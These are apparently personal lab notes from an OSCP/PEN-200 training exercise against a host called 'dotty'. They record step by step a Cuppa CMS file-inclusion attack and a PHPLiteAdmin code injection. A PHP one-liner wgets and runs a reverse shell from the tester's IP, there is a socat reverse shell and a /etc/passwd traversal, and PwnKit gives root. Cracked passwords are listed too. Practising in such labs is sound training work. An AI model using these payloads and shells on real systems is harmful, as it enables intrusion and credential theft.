![[Penetration Testing v2/oscp/Pen-200 Labs/10.11.1.116- linux - dotty/SCREENSHOTS/1. webpage.png]]

![[2. administrator.png]]

credentials: admin/admin
![[3. admin login.png]]

```shell
# going to add a php rev shell into a table

<?php
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          

?>
```


```shell
┌──(root㉿kali)-[/home/kali]
└─# searchsploit cuppa   
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                    | php/webapps/25971.txt
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

```shell
# changing script
<?php
	class Configuration{
		public $host = "10.11.1.116";
		public $db = "cuppa";
		public $user = "admin";
		public $password = "admin";
		public $table_prefix = "cu_";
		public $administrator_template = "default";
		public $list_limit = 25;
		public $token = "OBqIPqlFWf3X";
		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
		public $upload_default_path = "media/uploadsFiles";
		public $maximum_file_size = "5242880";
		public $secure_login = 0;
		public $secure_login_value = "";
		public $secure_login_redirect = "";
	}
?>
```


```shell
# found enw databass @ /db
```


![[4. phplite adminpage.png]]

![[5. found creds.png]]

```shell
# crackstation credentials:
# all md5 passes
#ssh and ftp logins did not work with these hashes
aaron:italia99
accasia:WindRunner
bethanyjoy02: couldnt find
deanna:marianna
jpotter:vipsu
```

```shell
#searchsploit phplite

PHPLiteAdmin 1.9.3 - Remote PHP Code Injection           | php/webapps/24044.txt

```

/cuppa/alerts/alertConfigField.php?urlConfig=

/usr/local/databases/newdb.php


![[try php web shell here.png]]


/index.php            (Status: 200) [Size: 4945]
/index.php            (Status: 200) [Size: 4945]
/js                   (Status: 301) [Size: 321] [--> http://10.11.1.116/administrator/js/]
/media                (Status: 301) [Size: 324] [--> http://10.11.1.116/administrator/media/]
/templates            (Status: 301) [Size: 328] [--> http://10.11.1.116/administrator/templates/]     


http://10.11.1.116/db/view.php?page=../../../../../../usr/local/databases/shell.php


<?php system("wget http://192.168.119.157/pentest.php -O /tmp/pentest.php;php /tmp/pentest.php");?>


http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=http://usr/local/databases/newdb.php


```shell
# displayes /etc/passwd
http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

#didnt work.
http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../http://usr/local/databases/newdb.php

#transferred pentest.php
http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../../usr/local/databases/newdb.php

```


```shell
# the story thus far..

#1st exploit
Essentially found cuppa cms (reference image 2) file inclusion and searchsploited it to find an exploit. in the /administrator directory when dirbusting

The exploit allows the attacker to use LFI/RFI in the /lerts/alertConfigField.php directory. 

# 2nd exploit 
found a phplightadmin version 1.9.3 in the /db folder which allows the inputting of php code in a table.

I created a table called newdb.php ( reference image 6 & 7 ) and input the code below

<?php system("wget http://192.168.119.157/pentest.php -O /tmp/pentest.php;php /tmp/pentest.php");?>

to grab my pentestmonkey reverse shell with wget, output it into /tmp/pentest.php and ; execute it which gave me my revshell.

# make sure to update methodolgy with php rev shell
```


![[6. newdb.php.png]]

![[7. wwwdata.png]]


```shell
# upgraded shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@dotty:/$ sudo -l
# beginning recon

#netstat
www-data@dotty:/$ ss -ant
ss -ant
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN     0      128          *:22                       *:*                  
LISTEN     0      80     127.0.0.1:3306                     *:*                  
LISTEN     0      64           *:110                      *:*                  
LISTEN     0      64           *:143                      *:*                  
ESTAB      0      100    10.11.1.116:43118              192.168.119.157:2323               
LISTEN     0      128         :::22                      :::*                  
LISTEN     0      128         :::80                      :::*                  
LISTEN     0      32          :::21                      :::*                  
ESTAB      0      0       ::ffff:10.11.1.116:80                  ::ffff:192.168.119.157:53550  

#OS
Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018

#/etc/crontab
www-data@dotty:/tmp$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


```

```shell
#transfered over linpeas
wget http://192.168.119.157/linpeas.sh

#going to try dirtycow
# transferred dirtycow
www-data@dotty:/tmp$ wget http://192.168.119.157/firefart_dirtycow.c
wget http://192.168.119.157/firefart_dirtycow.c
--2023-03-27 16:14:26--  http://192.168.119.157/firefart_dirtycow.c
Connecting to 192.168.119.157:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3217 (3.1K) [text/x-csrc]
Saving to: 'firefart_dirtycow.c'

firefart_dirtycow.c 100%[===================>]   3.14K  --.-KB/s    in 0.001s 
```

```shell
#upgraded shell to socat shell

```

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.119.157:4444

./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.119.157:4444



```shell

Looking for any advice for 10.11.1.116, looking to priv esc, tried two kernel exploits for priv esc and have seen references in the forums that this is the way forward but i keep getting this error.  version `GLIBC_2.34' not found. I precompiled both exploits considering gcc is not on the victim. dirtycow was also recommended by linpeas as well but doesn't work either. 

#  Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation 
www-data@dotty:/tmp$ ./45010
./45010: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./45010)

#Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation
www-data@dotty:/tmp$ ./44298
./44298: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./44298)
```

```shell
# not sure how pwnkit was determined but it worked
# LOOK FURTHER DOWN INTO LINPEAS RESULTS IF THE 1ST ONE DOESNT WORK.
CVE-2021-4034 github
https://github.com/ly4k/PwnKit

┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.116]
└─# curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit

```


```
www-data@dotty:/dev/shm$ wget http://192.168.119.157/PwnKit
--2023-03-27 18:03:13--  http://192.168.119.157/PwnKit
Connecting to 192.168.119.157:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: 'PwnKit'

PwnKit              100%[===================>]  17.62K  --.-KB/s    in 0.06s   

2023-03-27 18:03:13 (300 KB/s) - 'PwnKit' saved [18040/18040]

www-data@dotty:/dev/shm$ ls
44298  45010  CVE-2021-4034.py	PwnKit
www-data@dotty:/dev/shm$ chmod +x PwnKit
www-data@dotty:/dev/shm$ ./PwnKit
root@dotty:/dev/shm# 
root@dotty:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@dotty:/dev/shm# 
```

```shell
#proof.txt

proof.txt
root@dotty:~# cat proof.txt
f96fa30b9bc142e9d5c3649b055c28de
root@dotty:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:86:da:d4 brd ff:ff:ff:ff:ff:ff
    inet 10.11.1.116/16 brd 10.11.255.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe86:dad4/64 scope link 
       valid_lft forever preferred_lft forever
root@dotty:~# 
```

```shell
# proof
```

![[8. proof.txt.png]]


```shell

# the story thus far..

#1st exploit
Essentially found cuppa cms (reference image 2) file inclusion and searchsploited it to find an exploit. in the /administrator directory when dirbusting

The exploit allows the attacker to use LFI/RFI in the /lerts/alertConfigField.php directory. 

# 2nd exploit 
found a phplightadmin version 1.9.3 in the /db folder which allows the inputting of php code in a table.

I created a table called newdb.php ( reference image 6 & 7 ) and input the code below

<?php system("wget http://192.168.119.157/pentest.php -O /tmp/pentest.php;php /tmp/pentest.php");?>

to grab my pentestmonkey reverse shell with wget, output it into /tmp/pentest.php and ; execute it which gave me my revshell.

# make sure to update methodolgy with php rev shell
```